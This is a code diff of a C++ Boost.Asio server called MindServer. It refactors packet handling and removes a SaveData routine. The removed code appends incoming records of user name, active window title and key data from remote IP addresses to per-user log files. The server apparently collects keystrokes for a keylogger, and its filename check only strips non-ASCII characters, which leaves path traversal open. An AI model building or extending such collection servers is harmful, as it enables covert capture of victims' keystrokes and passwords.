@@ -21,11 +21,13 @@
 
 #include "common.hpp"
 #include "MindServer.h"
-#include <array>
+#include "PacketMgr.h"
 
 MindServer::MindServer(boost::asio::io_service& io_service, unsigned short port)
 : _acceptor(io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
 {
+    packetMgr = new PacketMgr;
+
     std::cout << TimeStamp() << "> " << "Listening...\n";
     ConnectionPtr newConn = std::make_shared<connection>(_acceptor.get_io_service());
 
@@ -34,6 +36,7 @@ MindServer::MindServer(boost::asio::io_service& io_service, unsigned short port)
 
 MindServer::~MindServer()
 {
+    delete packetMgr;
 }
 
 void MindServer::HandleAccept(const boost::system::error_code& e, ConnectionPtr conn)
@@ -52,66 +55,10 @@ void MindServer::HandleRead(const boost::system::error_code& e, ConnectionPtr co
     if (!e)
     {
         std::cout << TimeStamp() << "> " << "Update from IP: " << conn->socket().remote_endpoint().address().to_string().c_str() << ", Size: " << _receivedData.size() << "\n";
-        SaveData(conn);
+        if (!_receivedData.empty())
+            packetMgr->HandlePacket(std::move(_receivedData), conn);
+        _receivedData.clear();
     }
     else
         std::cerr << TimeStamp() << "> " << "Exeption Read: " << e.message().c_str() << std::endl;
-}
-
-// Only allow filename with ascii chars.
-void checkFileName(std::string &str)
-{
-    for (std::string::size_type i = 0; i < str.size(); ++i)
-    {
-        if (str[i] > char(127))
-            str[i] = char(95);
-    }
-}
-
-void MindServer::SaveData(ConnectionPtr conn)
-{
-    if (_receivedData.size() <= 0)
-        return;
-
-    std::string fileName = _receivedData[0].User + ".txt";
-    checkFileName(fileName);
-
-    std::cout << "Update file: " << fileName.c_str() << "\n";
-
-    std::ofstream myfile;
-    myfile.open(fileName.c_str(), std::ios::out | std::ios::app);
-
-    std::string lastWindowTitle = _receivedData[0].WindowTitle;
-
-    myfile << "----- BEGIN DATA, DATE: " << TimeStamp() << " -----\n";
-    myfile << "From: " << conn->socket().remote_endpoint().address().to_string() << "\n";
-    myfile << "Title: " << _receivedData[0].WindowTitle << "\n";
-    myfile << "Data: ";
-
-    for (auto &receivedData : _receivedData)
-    {
-        if (receivedData.WindowTitle == lastWindowTitle)
-            myfile << receivedData.Key;
-        else
-        {
-            myfile << "\n----------\n";
-            myfile << "Title: " << receivedData.WindowTitle << "\n";
-            myfile << "Data: ";
-            lastWindowTitle = receivedData.WindowTitle;
-        }
-    }
-    myfile << "\n----- END DATA -----\n\n";
-
-    myfile.close();
-}
-
-std::string MindServer::TimeStamp()
-{
-    std::array<char, 64> buffer;
-    buffer.fill(0);
-    time_t rawtime = time(nullptr);
-    auto timeinfo = localtime(&rawtime);
-    strftime(buffer.data(), sizeof(buffer), "%Y-%m-%d %H-%M-%S", timeinfo);
-    return std::string(buffer.data());
-
 }
